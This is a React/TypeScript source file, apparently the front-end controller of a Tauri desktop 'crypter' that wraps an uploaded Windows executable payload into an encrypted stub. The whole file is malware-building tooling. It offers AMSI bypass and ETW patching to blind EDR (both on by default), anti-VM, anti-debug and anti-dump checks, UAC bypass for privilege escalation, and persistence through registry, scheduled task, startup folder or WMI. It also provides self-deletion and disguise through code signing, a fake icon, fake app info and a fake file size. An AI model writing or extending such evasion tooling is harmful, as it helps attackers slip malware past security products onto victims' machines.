import { Settings, User, Lock, EyeOff, FileCheck, HardDrive } from "lucide-react";
import { useState } from "react";
import { Upload, Shield, Bug, Flame, Clock, Image, Info, Package, Key, Database, AlertTriangle, Loader2 } from "lucide-react";
import { invoke } from "@tauri-apps/api/core";
import { save } from "@tauri-apps/plugin-dialog";
import { useEncryption } from "../contexts/EncryptionContext";
import "./Controller.css";

export default function Controller() {
  const { addLog, setIsEncrypting, clearLogs, isEncrypting } = useEncryption();
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  
  // Encryption Method
  const [encryptionMethod, setEncryptionMethod] = useState<'aes' | 'xor' | 'rc4' | 'custom'>('aes');
  
  // Anti-Analysis
  const [antiVM, setAntiVM] = useState(false);
  const [antiDebugger, setAntiDebugger] = useState(false);
  
  // Advanced Evasion (Critical)
  const [bypassAMSI, setBypassAMSI] = useState(true); // enabled by default (critical)
  const [patchETW, setPatchETW] = useState(true); // enabled by default (critical)
  const [heapEncryption, setHeapEncryption] = useState(false);
  const [antiDump, setAntiDump] = useState(false);
  const [bypassUAC, setBypassUAC] = useState(false);
  
  // Execution Options
  const [melt, setMelt] = useState(false);
  const [sleep, setSleep] = useState(true); // enabled by default
  const [sleepUnit, setSleepUnit] = useState<'mins' | 'secs'>('secs');
  const [sleepValue, setSleepValue] = useState<number>(5); // 5 secs by default
  
  // Persistence
  const [persistence, setPersistence] = useState(false);
  const [persistenceMethod, setPersistenceMethod] = useState<'registry' | 'task' | 'startup' | 'wmi'>('registry');
  
  // Code Signing
  const [codeSigning, setCodeSigning] = useState(false);
  const [certificatePath, setCertificatePath] = useState<string>("");
  const [certificatePassword, setCertificatePassword] = useState<string>("");

  // Identity/Resources
  const [enableIcon, setEnableIcon] = useState(false);
  const [iconFile, setIconFile] = useState<File | null>(null);
  const [enableAppInfo, setEnableAppInfo] = useState(false);
  const [appName, setAppName] = useState("");
  const [appDescription, setAppDescription] = useState("");
  const [appVersion, setAppVersion] = useState("");
  const [enableFakeSize, setEnableFakeSize] = useState(false);
  const [fakeSize, setFakeSize] = useState(0);

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      setSelectedFile(file);
    }
  };

  const handleIconUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      setIconFile(file);
    }
  };

  // Drag and drop handlers
  const handleDragOver = (e: React.DragEvent<HTMLLabelElement>) => {
    e.preventDefault();
    e.stopPropagation();
  };
  const handleDrop = (e: React.DragEvent<HTMLLabelElement>) => {
    e.preventDefault();
    e.stopPropagation();
    const file = e.dataTransfer.files?.[0];
    if (file) {
      setSelectedFile(file);
    }
  };

  const handleEncrypt = async () => {
    if (!selectedFile) {
      addLog("Please select a file first", "error");
      return;
    }

    // Frontend validation
    const validExtensions = ['.exe', '.dll', '.scr', '.sys', '.com'];
    const fileExtension = selectedFile.name.toLowerCase().substring(selectedFile.name.lastIndexOf('.'));
    
    if (!validExtensions.includes(fileExtension)) {
      addLog(`Invalid file type: ${fileExtension}. Supported: ${validExtensions.join(', ')}`, "error");
      return;
    }

    // Validate file size (max 100MB - matches backend)
    const maxSize = 100 * 1024 * 1024; // 100MB
    const minSize = 64; // 64 bytes minimum
    if (selectedFile.size < minSize) {
      addLog(`File too small (${selectedFile.size} bytes). Minimum: ${minSize} bytes`, "error");
      return;
    }
    if (selectedFile.size > maxSize) {
      addLog(`File too large (${(selectedFile.size / 1024 / 1024).toFixed(2)}MB). Maximum: ${(maxSize / 1024 / 1024).toFixed(0)}MB`, "error");
      return;
    }

    clearLogs();
    setIsEncrypting(true);
    addLog(`Validating ${selectedFile.name}...`, "progress");

    try {
      // Read file as ArrayBuffer
      const arrayBuffer = await selectedFile.arrayBuffer();
      const fileData = Array.from(new Uint8Array(arrayBuffer));

      // Save file to temp location via Tauri
      const tempFilePath = await invoke<string>("save_uploaded_file", {
        fileData: fileData,
        fileName: selectedFile.name,
      });

      // Validate file structure
      addLog("Checking file structure...", "progress");
      try {
        const validation = await invoke<{
          valid: boolean;
          errors: string[];
          warnings: string[];
          file_info?: {
            size: number;
            is_pe: boolean;
            is_dll: boolean;
            is_exe: boolean;
            architecture?: string;
            entry_point?: number;
          };
        }>("validate_file_for_encryption", {
          filePath: tempFilePath,
        });

        // Show warnings if any
        if (validation.warnings && validation.warnings.length > 0) {
          validation.warnings.forEach((warning) => {
            addLog(`Warning: ${warning}`, "warning");
          });
        }

        // Show file info
        if (validation.file_info) {
          const info = validation.file_info;
          if (info.architecture) {
            addLog(`Architecture: ${info.architecture}`, "info");
          }
          if (info.is_dll) {
            addLog("File type: DLL", "info");
          } else if (info.is_exe) {
            addLog("File type: Executable", "info");
          }
        }
      } catch (validationError: any) {
        const errorMsg = validationError?.message || validationError?.toString() || "Validation failed";
        addLog(`Validation failed: ${errorMsg}`, "error");
        setIsEncrypting(false);
        return;
      }

      // Calculate sleep in seconds
      const sleepSeconds = sleep && sleepUnit === 'secs' 
        ? sleepValue 
        : sleep && sleepUnit === 'mins' 
          ? sleepValue * 60 
          : 0;

      // Read and save icon file if enabled
      let iconFilePath: string | null = null;
      if (enableIcon && iconFile) {
        const iconArrayBuffer = await iconFile.arrayBuffer();
        const iconFileData = Array.from(new Uint8Array(iconArrayBuffer));
        iconFilePath = await invoke<string>("save_uploaded_icon", {
          fileData: iconFileData,
          fileName: iconFile.name,
        });
      }
      
      // Ask user where to save the encrypted file
      const defaultFileName = selectedFile.name.replace(/\.[^/.]+$/, "_encrypted.exe");
      const outputPath = await save({
        defaultPath: defaultFileName,
        filters: [{
          name: "Executable",
          extensions: ["exe"]
        }]
      });

      if (!outputPath) {
        addLog("Save cancelled", "warning");
        setIsEncrypting(false);
        return;
      }

      // File validated, proceed with encryption
      addLog(`File validated successfully. Starting encryption...`, "success");
      addLog(`Compiling stub with ${encryptionMethod.toUpperCase()} encryption...`, "progress");

      const result = await invoke<string>("encrypt_exe", {
        filePath: tempFilePath,
        method: encryptionMethod,
        antiVm: antiVM,
        antiDebug: antiDebugger,
        bypassAmsi: bypassAMSI,
        patchEtw: patchETW,
        heapEncryption: heapEncryption,
        antiDump: antiDump,
        melt: melt,
        sleepEnabled: sleep,
        sleepSeconds: sleepSeconds,
        persistence: persistence,
        persistenceMethod: persistence ? persistenceMethod : null,
        bypassUac: bypassUAC,
        codeSigning: codeSigning,
        certificatePath: codeSigning && certificatePath ? certificatePath : null,
        certificatePassword: codeSigning && certificatePassword ? certificatePassword : null,
        enableIcon: enableIcon,
        iconPath: iconFilePath,
        enableAppInfo: enableAppInfo,
        appName: enableAppInfo && appName ? appName : null,
        appDescription: enableAppInfo && appDescription ? appDescription : null,
        appVersion: enableAppInfo && appVersion ? appVersion : null,
        enableFakeSize: enableFakeSize,
        fakeSize: enableFakeSize ? fakeSize : null,
        outputPath: outputPath,
      });

      // Success!
      addLog("Encryption completed successfully!", "success");
      addLog(result, "success");
      
    } catch (error: any) {
      // Parse and display better error messages
      let errorMessage = error?.message || error?.toString() || "Unknown error occurred";
      
      // Make error messages more user-friendly
      if (errorMessage.includes("File validation failed")) {
        errorMessage = errorMessage.replace("File validation failed: ", "");
      } else if (errorMessage.includes("Failed to read PE file")) {
        errorMessage = "Invalid PE file structure. Please ensure the file is a valid Windows executable.";
      } else if (errorMessage.includes("Invalid encryption method")) {
        errorMessage = "Invalid encryption method selected. Please choose a valid method.";
      } else if (errorMessage.includes("Failed to compile stub")) {
        if (errorMessage.includes("requires Windows")) {
          errorMessage = "Stub compilation requires Windows. The stub is a Windows executable that can only be compiled on Windows.";
        } else {
          errorMessage = "Failed to compile stub executable. Check that Rust toolchain is installed and stub directory exists.";
        }
      } else if (errorMessage.includes("Failed to write stub code")) {
        errorMessage = "Failed to write stub code. Check file permissions and disk space.";
      } else if (errorMessage.includes("No such file or directory")) {
        errorMessage = "File or directory not found. Please check the file path and try again.";
      }
      
      addLog(`Encryption failed: ${errorMessage}`, "error");
      console.error("Encryption error:", error);
    } finally {
      setIsEncrypting(false);
    }
  };

  return (
    <div className="controller">
      <div className="controller-header">
        <h2 className="controller-title">
          <Settings size={18} />
          Controller
        </h2>
      </div>
      <div className="controller-content scrollable-controller-content">
        {/* File Upload Section */}
        <div className="file-upload-section">
          <label
            htmlFor="file-upload"
            className="file-upload-area enhanced-upload"
            onDragOver={handleDragOver}
            onDrop={handleDrop}
          >
            <Upload size={24} className="upload-icon" />
            <div className="upload-text">
              {selectedFile ? (
                <div className="file-preview">
                  <span className="file-name">{selectedFile.name}</span>
                  <span className="file-size">{(selectedFile.size / 1024).toFixed(2)} KB</span>
                  <span className="file-type">{selectedFile.type || "Unknown type"}</span>
                </div>
              ) : (
                <>
                  <span className="upload-title">Upload Your Exe Payload</span>
                  <span className="upload-subtitle">max size should be 10MB</span>
                </>
              )}
            </div>
          </label>
          <input
            id="file-upload"
            type="file"
            onChange={handleFileUpload}
            className="file-input"
            title="Upload file"
          />
        </div>

        {/* ...existing code... */}

        {/* ...removed duplicate Identity option blocks... */}

        {/* Encryption Method Section */}
        <div className="section-divider"><span><Key size={16} />Encryption</span></div>
        <div className="encryption-method-section">
          <div className="setting-item enhanced-setting encryption-method-item">
            <div className="setting-label">
              <Key size={16} />
              <span>Encryption</span>
            </div>
            <select
              value={encryptionMethod}
              onChange={(e) => setEncryptionMethod(e.target.value as 'aes' | 'xor' | 'rc4' | 'custom')}
              className="method-select"
              title="Select encryption method"
            >
              <option value="aes">AES-256</option>
              <option value="xor">XOR</option>
              <option value="rc4">RC4</option>
              <option value="custom">Custom (Multi-Layer)</option>
            </select>
          </div>
          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <FileCheck size={16} />
              <span>Sign Executable</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={codeSigning}
                onChange={(e) => setCodeSigning(e.target.checked)}
                title="Sign executable with certificate (Makes it look legitimate)"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>
        </div>

        {/* Config Section Divider */}
        <div className="section-divider"><span><Settings size={16} />Config</span></div>
        <div className="settings-section">
          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Shield size={16} />
              <span>Anti VM</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={antiVM}
                onChange={(e) => setAntiVM(e.target.checked)}
                title="Enable Anti VM"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>

          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Bug size={16} />
              <span>Anti Debug</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={antiDebugger}
                onChange={(e) => setAntiDebugger(e.target.checked)}
                title="Enable Anti Debugger"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>

          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Flame size={16} />
              <span>Melt</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={melt}
                onChange={(e) => setMelt(e.target.checked)}
                title="Enable Melt (Self-destruct)"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>

          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Clock size={16} />
              <span>Sleep</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={sleep}
                onChange={(e) => setSleep(e.target.checked)}
                title="Enable Sleep (Delay execution)"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>
        </div>

        {/* Sleep Options Grid */}
        {sleep && (
          <div className="sleep-options-grid">
            <div className="sleep-unit-toggle">
              <label>
                <input
                  type="radio"
                  name="sleep-unit"
                  value="secs"
                  checked={sleepUnit === 'secs'}
                  onChange={() => setSleepUnit('secs')}
                  title="Sleep in seconds"
                />
                <span>Secs</span>
              </label>
              <label>
                <input
                  type="radio"
                  name="sleep-unit"
                  value="mins"
                  checked={sleepUnit === 'mins'}
                  onChange={() => setSleepUnit('mins')}
                  title="Sleep in minutes"
                />
                <span>Mins</span>
              </label>
            </div>
            <div className="sleep-value-dropdown">
              <label htmlFor="sleep-value">Delay:</label>
              <select
                id="sleep-value"
                value={sleepValue}
                onChange={e => setSleepValue(Number(e.target.value))}
              >
                {Array.from({ length: sleepUnit === 'secs' ? 60 : 30 }, (_, i) => i + 1).map(val => (
                  <option key={val} value={val}>{val}</option>
                ))}
              </select>
              <span>{sleepUnit === 'secs' ? 'Secs' : 'Mins'}</span>
            </div>
          </div>
        )}

        {/* Advanced Evasion Section */}
        <div className="section-divider"><span><Lock size={16} />Advanced Evasion</span></div>
        <div className="settings-section">
          <div className="setting-item enhanced-setting critical-setting">
            <div className="setting-label">
              <EyeOff size={16} />
              <span>Bypass AMSI</span>
              <span className="critical-badge">Critical</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={bypassAMSI}
                onChange={(e) => setBypassAMSI(e.target.checked)}
                title="Bypass Windows Anti-Malware Scan Interface (Recommended)"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>

          <div className="setting-item enhanced-setting critical-setting">
            <div className="setting-label">
              <EyeOff size={16} />
              <span>Patch ETW</span>
              <span className="critical-badge">Critical</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={patchETW}
                onChange={(e) => setPatchETW(e.target.checked)}
                title="Patch Event Tracing for Windows (Blinds EDR)"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>

          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <HardDrive size={16} />
              <span>Heap Encryption</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={heapEncryption}
                onChange={(e) => setHeapEncryption(e.target.checked)}
                title="Encrypt heap to prevent memory scanning"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>

          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Database size={16} />
              <span>Anti-Dump</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={antiDump}
                onChange={(e) => setAntiDump(e.target.checked)}
                title="Prevent memory dumps"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>

          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Shield size={16} />
              <span>Bypass UAC</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={bypassUAC}
                onChange={(e) => setBypassUAC(e.target.checked)}
                title="Bypass User Account Control (for privilege escalation)"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>

          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <AlertTriangle size={16} />
              <span>Enable Persistence</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={persistence}
                onChange={(e) => setPersistence(e.target.checked)}
                title="Enable persistence (Warning: Can be detected by blue team)"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>
        </div>

        {persistence && (
          <div className="persistence-options">
            <label htmlFor="persistence-method">Persistence Method:</label>
            <select
              id="persistence-method"
              value={persistenceMethod}
              onChange={(e) => setPersistenceMethod(e.target.value as 'registry' | 'task' | 'startup' | 'wmi')}
              className="method-select"
              title="Select persistence method"
            >
              <option value="registry">Registry Run Key</option>
              <option value="task">Scheduled Task</option>
              <option value="startup">Startup Folder</option>
              <option value="wmi">WMI Event Subscription</option>
            </select>
            <div className="warning-text">
              <AlertTriangle size={14} />
              <span>Persistence can be detected by blue team monitoring</span>
            </div>
          </div>
        )}

        {codeSigning && (
          <div className="code-signing-options">
            <div className="file-upload-section">
              <label htmlFor="certificate-upload" className="file-upload-area enhanced-upload">
                <Upload size={20} className="upload-icon" />
                <span>Upload Certificate (.pfx)</span>
                <input
                  id="certificate-upload"
                  type="file"
                  accept=".pfx,.p12"
                  onChange={(e) => {
                    const file = e.target.files?.[0];
                    if (file) setCertificatePath(file.name);
                  }}
                  className="file-input"
                  title="Upload certificate file"
                />
              </label>
            </div>
            <div className="app-info-label">
              <label htmlFor="cert-password">Certificate Password:</label>
              <input
                id="cert-password"
                className="app-info-input"
                type="password"
                value={certificatePassword}
                onChange={(e) => setCertificatePassword(e.target.value)}
                placeholder="Enter certificate password"
                title="Certificate password"
              />
            </div>
          </div>
        )}

        {/* Identity Section Divider */}
        <div className="section-divider"><span><User size={16} />Identity</span></div>

        {/* Optional Features: App Icon, App Info, App Size */}
        <div className="options-grid">
          {/* App Icon Option */}
          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Image size={16} />
              <span>App Icon</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={enableIcon}
                onChange={e => setEnableIcon(e.target.checked)}
                title="Enable App Icon"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>
          {/* App Info Option */}
          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Info size={16} />
              <span>App Info</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={enableAppInfo}
                onChange={e => setEnableAppInfo(e.target.checked)}
                title="Enable App Info"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>
          {/* Size Option */}
          <div className="setting-item enhanced-setting">
            <div className="setting-label">
              <Package size={16} />
              <span>App Size</span>
            </div>
            <label className="toggle-switch modern-toggle">
              <input
                type="checkbox"
                checked={enableFakeSize}
                onChange={e => setEnableFakeSize(e.target.checked)}
                title="Enable  Size"
              />
              <span className="toggle-slider"></span>
            </label>
          </div>
        </div>

        {enableIcon && (
          <div className="file-upload-section">
            <label htmlFor="icon-upload" className="file-upload-area enhanced-upload">
              <Upload size={20} className="upload-icon" />
              <span>Upload App Icon</span>
              <input
                id="icon-upload"
                type="file"
                accept="image/*"
                onChange={handleIconUpload}
                className="file-input"
                title="Upload App Icon"
              />
            </label>
          </div>
        )}

        {enableAppInfo && (
          <div className="app-info-section">
            <div className="app-info-row">
              <div className="app-info-label">
                <label htmlFor="appName">App Name</label>
                <input
                  id="appName"
                  className="app-info-input"
                  type="text"
                  value={appName}
                  onChange={e => setAppName(e.target.value)}
                  placeholder="e.g. X-Crypter"
                  title="App Name"
                />
              </div>
              <div className="app-info-label">
                <label htmlFor="appVersion">Version</label>
                <input
                  id="appVersion"
                  className="app-info-input"
                  type="text"
                  value={appVersion}
                  onChange={e => setAppVersion(e.target.value)}
                  placeholder="e.g. 1.0.0"
                  title="App Version"
                />
              </div>
            </div>
            <div className="app-info-label app-info-desc">
              <label htmlFor="appDescription">Description</label>
              <input
                id="appDescription"
                className="app-info-input"
                type="text"
                value={appDescription}
                onChange={e => setAppDescription(e.target.value)}
                placeholder="Short description..."
                title="App Description"
              />
            </div>
          </div>
        )}

        {enableFakeSize && (
          <div className="fake-size-section">
            <label htmlFor="fake-size-input">Size (KB)</label>
            <input
              id="fake-size-input"
              type="number"
              min="0"
              value={fakeSize}
              onChange={e => setFakeSize(Number(e.target.value))}
              className="fake-size-input"
              placeholder="e.g. 1024"
              title="Size"
            />
          </div>
        )}

        {/* Encrypt Button */}
        <button 
          className="encrypt-button enhanced-encrypt" 
          onClick={handleEncrypt}
          disabled={isEncrypting || !selectedFile}
          title={!selectedFile ? "Please select a file first" : isEncrypting ? "Encryption in progress..." : "Encrypt the selected file"}
        >
          {isEncrypting ? (
            <>
              <Loader2 size={18} className="spinner" />
              <span>Encrypting...</span>
            </>
          ) : (
            "Encrypt"
          )}
        </button>
      </div>
    </div>
  );
}
